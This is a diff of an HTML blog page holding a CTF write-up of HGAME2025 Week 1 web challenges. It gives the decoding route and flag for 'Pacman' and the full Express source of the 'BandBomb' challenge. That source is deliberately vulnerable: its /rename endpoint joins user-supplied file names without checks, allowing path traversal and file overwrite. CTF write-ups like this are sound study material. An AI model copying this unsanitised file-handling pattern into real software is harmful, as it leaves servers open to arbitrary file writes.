@@ -1,973 +1,388 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Hexo Theme Redefine">
-    
-    <meta name="author" content="p0l1st">
-    <!-- preconnect -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>HGAME2025 WEEK1 Web Writeup - p0l1st&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
 
-    
-    <!--- Seo Part-->
-    
-    <link rel="canonical" href="http://example.com/2025/02/10/hgame2025-week1-web-writeup/"/>
-    <meta name="robots" content="index,follow">
-    <meta name="googlebot" content="index,follow">
-    <meta name="revisit-after" content="1 days">
-    
-        <meta name="description" content="false">
-<meta property="og:type" content="article">
-<meta property="og:title" content="HGAME2025 WEEK1 Web Writeup">
-<meta property="og:url" content="http://example.com/2025/02/10/HGAME2025-WEEK1-Web-Writeup/index.html">
-<meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="false">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330109.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330146.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101332143.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101331952.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330017.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330123.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330228.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330161.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101333759.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330170.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330221.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330114.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330137.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502062137977.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502061716289.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330928.png">
-<meta property="article:published_time" content="2025-02-10T05:28:16.000Z">
-<meta property="article:modified_time" content="2025-02-11T15:53:51.476Z">
-<meta property="article:author" content="p0l1st">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330109.png">
-    
-    
-    <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
-    <meta name="theme-color" content="#A31F34">
-    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
-    <!--- Page Info-->
-    
-    <title>
+  
+  
+  
+  <meta property="og:title" content="HGAME2025 WEEK1 Web Writeup - p0l1st&#39;s blog" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2025/02/10/HGAME2025-WEEK1-Web-Writeup/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-02-10T05:28:16.000Z" />
+  
+  <meta property="og:article:author" content="p0l1st" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
         
-            HGAME2025 WEEK1 Web Writeup -
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
         
-        p0l1st&#39;s blog
-    </title>
-
-    
-<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
-
-
-    <!--- Inject Part-->
-    
+        data-config-root="/"
         
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
             
-    
             
-    
-
-    
-<link rel="stylesheet" href="/css/style.css">
-
-
-    
-        
-<link rel="stylesheet" href="/assets/build/styles.css">
-
-    
-
-    
-<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
-
-    
-<link rel="stylesheet" href="/fonts/Geist/geist.css">
-
-    <!--- Font Part-->
-    
-    
-        <link href="" rel="stylesheet">
-    
-    
-    
-    
-    
-
-    <script id="hexo-configurations">
-    window.config = {"hostname":"example.com","root":"/","language":"en"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"p0l1st's blog","subtitle":{"text":[""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":1,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/8/17 11:45:14"};
-    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
-    window.data = {"masonry":false};
-  </script>
-    
-    <!--- Fontawesome Part-->
-    
-<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/brands.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/solid.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/regular.min.css">
-
-    
-    
-    
-    
-<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
-</head>
-
-
-<body>
-<div class="progress-bar-container">
-    
-
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
-</div>
-
-
-
-<main class="page-container" id="swup">
-
-    
-
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
-
-    <div class="navbar-content ">
-        <div class="left">
+            <a class="nav-item" href="/archives">Archives</a>
             
-            <a class="logo-title" href="/">
-                
-                p0l1st&#39;s blog
-                
-            </a>
-        </div>
-
-        <div class="right">
-            <!-- PC -->
-            <div class="desktop">
-                <ul class="navbar-list">
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/"
-                                        >
-                                    <i class="fa-regular fa-house fa-fw"></i>
-                                    HOME
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/archives"
-                                        >
-                                    <i class="fa-regular fa-archive fa-fw"></i>
-                                    ARCHIVES
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/about"
-                                        >
-                                    <i class="fa-regular fa-user fa-fw"></i>
-                                    ABOUT
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/links"
-                                        >
-                                    <i class="fa-regular fa-link fa-fw"></i>
-                                    LINKS
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                    
-                        <li class="navbar-item search search-popup-trigger">
-                            <i class="fa-solid fa-magnifying-glass"></i>
-                        </li>
-                    
-                </ul>
-            </div>
-            <!-- Mobile -->
-            <div class="mobile">
-                
-                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
-                    </div>
-                
-                <div class="icon-item navbar-bar">
-                    <div class="navbar-bar-middle"></div>
-                </div>
-            </div>
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
         </div>
     </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
 
-    <!-- Mobile sheet -->
-    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
-        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
-            
-                
-                    
+        
+        <div class="date" id="date">
+            <span>February</span>
+            <span>10,</span>
+            <span>2025</span>
+        </div>
+        
 
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/"
-                        >
-                            <span>
-                                HOME
-                            </span>
-                            
-                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/archives"
-                        >
-                            <span>
-                                ARCHIVES
-                            </span>
-                            
-                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/about"
-                        >
-                            <span>
-                                ABOUT
-                            </span>
-                            
-                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/links"
-                        >
-                            <span>
-                                LINKS
-                            </span>
-                            
-                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-
-            
-            
-        </ul>
-
-        <div class="statistics flex justify-around my-2.5">
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
-        <div class="label text-third-text-color text-sm">Tags</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">Categories</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
-        <div class="label text-third-text-color text-sm">Posts</div>
-    </a>
-</div>
+        <h1 class="title">HGAME2025 WEEK1 Web Writeup</h1>
     </div>
 
-    <div class="window-mask"></div>
+    <div class="divider"></div>
 
-</header>
-
-
-        </div>
-
-        <div class="main-content-body">
-
-            
-
-            <div class="main-content">
-
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HGAME2025 WEEK1 Web Writeup</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407102114048.jpeg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">p0l1st</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-02-10 13:28:16</span>
-        <span class="mobile">2025-02-10 13:28:16</span>
-        <span class="hover-info">Created</span>
-    </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-02-11 23:53:51</span>
-            <span class="mobile">2025-02-11 23:53:51</span>
-            <span class="hover-info">Updated</span>
-        </span>
-    
-
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/CTF/">CTF</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-
-    
-    
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
-
-                    </div>
-                </div>
-            </div>
-        
-
-        
-
-
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h1><p>index.js</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330109.png" alt="image-20250204203705984"></p>
+    <div class="content">
+        <h1 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h1><p>index.js</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330109.png" alt="image-20250204203705984"></p>
 <p>base64+栅栏2解密</p>
-<img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330146.png" alt="image-20250204203827139" style="zoom:50%;">
+<img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330146.png" alt="image-20250204203827139" style="zoom:50%;">
 
 <p>hgame{u_4re_pacman_m4ster}</p>
-<h1 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h1><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
